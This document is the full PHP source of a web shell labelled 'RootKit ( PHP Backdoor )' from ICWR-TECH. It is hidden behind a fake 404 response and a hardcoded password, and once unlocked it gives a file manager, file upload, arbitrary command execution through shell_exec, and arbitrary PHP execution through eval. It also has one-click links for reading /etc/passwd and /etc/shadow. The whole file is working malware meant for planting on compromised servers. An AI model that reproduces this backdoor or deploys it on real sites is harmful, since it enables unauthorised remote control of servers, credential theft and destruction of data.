<?php
// RootKit ( PHP BackDoor )
// Copyright (C)2019 - ICWR-TECH
error_reporting(0);
header('HTTP/1.0 404 Not Found', true, 404);
session_start();
$pass = "jancok";
if($_POST['passwd'] == $pass) {
  $_SESSION['rootkit'] = $pass;
  echo "<script>window.location='?'</script>";
}
if($_GET['page'] == "blank") {
  echo "<a href='?'>Back</a>";
  exit();
}
if(isset($_REQUEST['logout'])) {
  session_destroy();
  echo "<script>window.location='?'</script>";
}
if(!($_SESSION['rootkit'])) {
?>
<title>RootKit ( PHP Backdoor )</title>
<link rel="icon" href="https://img.deusm.com/darkreading/bh-asia-facebook-profile.png">
<style>
  html{
    overflow: auto;
    background: black;
    color: white;
    font-family: "Courier New";
  }
  input {
    background: transparent;
    color: white;
    height: 40px;
    border: 1px solid white;
    border-radius: 20px;
    padding: 5px;
    font-size: 20px;
  }
  .img {
    width: 170px;
    border: 3px solid white;
    border-radius: 20px;
  }
</style>
<table width="100%" height="100%">
  <td align="center">
    <form enctype="multipart/form-data" method="post">
      <img class="img" src="https://img.deusm.com/darkreading/bh-asia-facebook-profile.png"/>
      <br><br>
      <font size="5">( RootKit )</font>
      <br><br>
      <input type="password" name="passwd" placeholder="Enter the password....">
      <input type="submit" value="Login">
      <br>
      <?php echo $_SESSION['rootkit']; ?>
    </form>
  </td>
</table>
<?php
exit();
}
?>
<?php
$dir_raw = str_replace('\\', "/", getcwd());
$host = $_SERVER['HTTP_HOST'];
if($dn = $_GET['d']) {
  $_SESSION['dir'] = $dn;
  echo "<script>window.location = '?';</script>";
}
if(empty($_SESSION['dir'])) {
  $dir = $dir_raw;
} else {
  $dir = $_SESSION['dir'];
}
$exp = explode("/", $dir);
foreach($exp as $x=>$dirx) {
  if(empty($dirx)){
    continue;
  }
  $do .= "<li class='bar'><a class='a-bar' href='?d=";
  for($i=0;$i<=$x;$i++) {
    $do .= $exp[$i]."/";
  }
  $do .= "'>$dirx</a></li>\n";
}
chdir($dir);
?>
<title>RootKit ( PHP Backdoor )</title>
<?php
if(isset($_REQUEST['exe_code'])) {
  if($_POST['code']) {
    $_SESSION['code'] = '?>'.$_POST['code'];
  }
  eval($_SESSION['code']);
  echo "<hr><a href='?page=scripting'>Back</a>";
  exit();
}
?>
<link rel="icon" href="https://img.deusm.com/darkreading/bh-asia-facebook-profile.png">
<style>
  html{
    overflow: auto;
    background: black;
    color: white;
    font-family: "Courier New";
  }
  a {
    text-decoration: none;
    color: white;
  }
  .a-bar {
    text-decoration: none;
    color: black;
  }
  .bar {
    display: inline;
    padding: 5px;
    background: white;
    color: black;
  }
  .baratas {
    overflow: auto;
    border: 1px solid white;
    padding: 10px;
    background: white;
    color: black;
  }
  .close {
    overflow: auto;
    border: 1px solid red;
    background: red;
    color: white;
  }
  .kotak {
    overflow: auto;
    border: 1px solid white;
    padding: 10px;
    color: white;
  }
  .l {
    float: left;
    width: 50%;
  }
  .r {
    float: right;
    width: 50%;
    text-align: right;
  }
  .l1 {
    float: left;
    width: 20%;
    border: 1px solid white;
    padding: 10px;
  }
  .r1 {
    float: right;
    width: 75%;
    border: 1px solid white;
    padding: 10px;
  }
  input {
    background: white;
    color: black;
    border: 1px solid white;
    padding: 5px;
  }
  .file {
    width: 100%;
    height: 50%;
  }
</style>
<div class="baratas">
  <div class="l">
    RootKit ( PHP Backdoor ) - ICWR-TECH
  </div>
  <div class="r">
      <a class="a-bar" href="?page=blank">[_]</a>
      <a class="a-bar" href="?page=blank">[-]</a>
      <a class="close" href="?logout">[X]</a>
  </div>
</div>
<div class="kotak">
  [ <a href="?">File Manager</a> ]
  [ <a href="?page=upload">Upload</a> ]
  [ <a href="?page=shell">Command Shell</a> ]
  [ <a href="?page=scripting">Scripting</a> ]
  [ <a href="?page=about">About</a> ]
</div>
<div class="kotak">
  [ Directory ] => <li class="bar"><a class="a-bar" href="?d=/">/</a></li><?php echo "\n".$do; ?>
</div>
<div class="kotak">
  <div class="l1">
    <div class="baratas">
      Action
    </div>
    <hr>
    [*] <a href="?page=newfile">New File</a>
    <br>
    [*] <a href="?page=newfolder">New Folder</a>
    <hr>
    <div class="baratas">
      Sensitive File
    </div>
    <hr>
    [*] <a href="?file=/etc/passwd">/etc/passwd</a>
    <br>
    [*] <a href="?file=/etc/shadow">/etc/shadow</a>
    <br>
    [*] <a href="?file=/etc/resolv.conf">/etc/resolv.conf</a>
  </div>
  <div class="r1">
      <?php
      if($_GET['file']) {
      ?>
[ <a href="?file=<?php echo $_GET['file']; ?>&delete=true">Delete</a> ]
[ <a href="?file=<?php echo $_GET['file']; ?>&edit=true">Edit</a> ]
[ <a href="?file=<?php echo $_GET['file']; ?>&rename=true">Rename</a> ]
[ <a href="?">Back</a> ]
<hr>
      <?php
        if(!$_GET['edit'] && !$_GET['delete'] && !$_GET['rename']) {
          echo "<textarea class='file'>".htmlspecialchars(file_get_contents($_GET[file]))."</textarea>";
        }
        if($_GET['edit'] == "true") {
          echo "<form enctype='multipart/form-data' method='post'>
          <textarea class='file' name='edit_file'>".htmlspecialchars(file_get_contents($_GET['file']))."</textarea>
          <br><br>
          <input type='submit' value='Save File'>
          </form>
          ";
          if($_POST['edit_file']) {
            $fedit = fopen($_GET['file'], "w");
            if(fwrite($fedit, $_POST['edit_file'])) {
              fclose($fedit);
              echo "<script>alert('Edit File Success !!!'); window.location = '?file=$_GET[file]';</script>";
            } else {
              echo "<script>alert('Edit File Failed !!!'); window.location = '?file=$_GET[file]';</script>";
            }
          }
        }
        if($_GET['delete'] == "true") {
          if(unlink($_GET['file'])) {
            echo "<script>alert('File Deleted !!!'); window.location = '?';</script>";
          } else {
            echo "<script>alert('Failed Deleted File !!!'); window.location = '?file=$_GET[file]';</script>";
          }
        }
        if($_GET['rename'] == "true") {
          echo "<form enctype='multipart/form-data' method='post'>
          ".htmlspecialchars($_GET['file'])." [ To ] <input type='text' name='rename_file'>
          <input type='submit' value='Rename'>
          </form>
          ";
          if($_POST['rename_file']) {
            if(copy($_GET['file'], $_POST['rename_file'])) {
              unlink($_GET['file']);
              echo "<script>alert('File Renamed !!!'); window.location = '?';</script>";
            } else {
              echo "<script>alert('Failed Rename File !!!'); window.location = '?file=$_GET[file]';</script>";
            }
          }
        }
      }
      if(!$_GET) {
        echo "<form enctype='multipart/form-data' method='post'>
        Rename This Folder : <input type='text' name='rename_folder'><input type='submit' value='Rename'>
        <a class='baratas' href='?rmfolder=$dir'>Remove This Folder</a>
        </form>
        <hr>
        ";
        if($_POST['rename_folder']) {
          if(mkdir("../".$_POST['rename_folder'])) {
            rmdir("../".$dir);
            echo "<script>alert('This Folder is Renamed !!!'); window.location = '?d=$dir/..';</script>";
          } else {
            echo "<script>alert('This Folder is Failed Rename !!!'); window.location = '?';</script>";
          }
        }
        if($_GET['rmfolder']) {
          if(rmdir($dir)) {
            echo "<script>alert('Folder Deleted !!!'); window.location = '?d=$dir/..';</script>";
          } else {
            echo "<script>alert('This Folder is Failed Delete !!!'); window.location = '?';</script>";
          }
        }
        $scndir = scandir($dir);
        foreach($scndir as $sdir) {
          if(is_dir($dir."/".$sdir)) {
            echo "<a href='?d=$dir/$sdir'><img height='20' src='https://raw.githubusercontent.com/ICWR-TECH/php-rootkit/master/folder.png'/> ".htmlspecialchars($sdir)."</a><br>";
          }
          if(is_file($dir."/".$sdir)) {
            echo "<a href='?file=$dir/$sdir'><img height='20' src='https://raw.githubusercontent.com/ICWR-TECH/php-rootkit/master/file.png'/> ".htmlspecialchars($sdir)."</a><br>";
          }
        }
      }
      if($_GET['page'] == "upload") {
        echo "Upload File
        <br><br>
        <form enctype='multipart/form-data' method='post'>
        <input type='file' name='up'>
        <input type='submit' value='Upload'>
        </form>
        ";
        if($_FILES['up']) {
          if(copy($_FILES['up']['tmp_name'], $_FILES['up']['name'])) {
            echo "[+] Success : ".$_FILES['up']['name'];
          } else {
            echo "[-] Failed : ".$_FILES['up']['name'];
          }
          echo "<br>";
        }
      }
      if($_GET['page'] == "shell") {
        if($_POST['shell']) {
          echo "RootKit@$host:~ $ ".$_POST['shell'];
          echo "<pre>".htmlspecialchars(shell_exec($_POST['shell']))."</pre>";
        }
        echo "<form enctype='multipart/form-data' method='post'>
        RootKit@$host:~ $ <input type='text' name='shell'><input type='submit' value='~'>
        </form>";
      }
      if($_GET['page'] == "scripting") {
        if(empty($str_code)) {
          $str_code = "<?php echo 'Hello World'; ?>";
        } else {
          $str_code = htmlspecialchars($_SESSION['code']);
        }
        echo "<form action='?exe_code' enctype='multipart/form-data' method='post'>
        <center>Running PHP Script</center>
        <hr>
        <textarea class='file' name='code'>$str_code</textarea>
        <bR><br>
        <input type='submit' value='Run Script !!!'>
        </form>
        ";
      }
      if($_GET['page'] == "about") {
        echo "
        <center>
        <font size='20'>RootKit ( PHP Backdoor )</font>
        <br><br>
        <font size='5'>ICWR-TECH</font>
        <bR><br>
        Getting Dizzy Our Feel Cozy
        <br><br>
        Release : <a href='https://github.com/icwr-tech/php-rootkit'>https://github.com/icwr-tech/php-rootkit</a>
        </center>
        ";
      }
      if($_GET['page'] == "newfile") {
        echo "<form enctype='multipart/form-data' method='post'>
        <textarea class='file' name='isi_file'>".htmlspecialchars(file_get_contents($_GET['file']))."</textarea>
        <br><br>
        <input type='text' name='name_file'>
        <br><bR>
        <input type='submit' value='Save File'>
        </form>
        ";
        if($_POST['name_file']) {
          $nfile = fopen($_POST['name_file'], "w");
          if(fwrite($nfile, $_POST['isi_file'])) {
            echo "<script>alert('File Created !!!'); window.location = '?';</script>";
          } else {
            echo "<script>alert('Created File Failed !!!'); window.location = '?';</script>";
          }
        }
      }
      if($_GET['page'] == "newfolder") {
        echo "<form enctype='multipart/form-data' method='post'>
        New Folder : <input type='text' name='name_folder'>
        <input type='submit' value='Save Folder'>
        </form>
        ";
        if($_POST['name_folder']) {
          if(mkdir($_POST['name_folder'])) {
            echo "<script>alert('Folder Created !!!'); window.location = '?';</script>";
          } else {
            echo "<script>alert('Created Folder Failed !!!'); window.location = '?';</script>";
          }
        }
      }
      ?>
  </div>
</div>
<div class="kotak">
  <div class="l">
    Free Space : <?php echo disk_free_space("/"); ?> Byte
  </div>
  <div class="r">
    Copyright &copy;2019 - ICWR-TECH
  </div>
</div>
